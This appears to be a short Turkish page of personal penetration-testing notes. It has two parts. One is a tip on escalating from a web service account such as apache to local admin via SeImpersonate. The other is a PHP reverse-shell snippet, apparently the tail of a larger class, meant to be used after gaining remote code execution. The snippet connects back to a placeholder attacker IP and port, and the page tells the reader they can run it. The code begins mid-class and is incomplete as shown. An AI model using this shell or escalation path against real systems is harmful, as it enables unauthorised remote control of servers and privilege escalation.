---
layout: default
title: Notlar
permalink: /notlar/
---

# Notlar

## 1) Servis/Users Uyarısı

'users' listelediğinde apache gibi webe dair veya bir servise dair kullanıcı görüyorsan bunu abuse yolu düşünmelisin. webse mesela webi çalıştıran servis odur ve lokal admin pathi apache -> SeImpersonate->Lokal admin diye.

## 2) RCE - PHP Shell Snippet

Aşağıdaki PHP kodu, hedefte RCE aldığında kullanılmak üzere bir shell wrapper örneğidir. (Hedef PHP ise web üzerinden bu tarz bir shell ile etkileşim kurabilirsin.)

```php
 } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('<IP GİR BURAYA>', <PORT GIR BURAYA>);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

BUNU ÇALIŞTIRABİLİRSİN
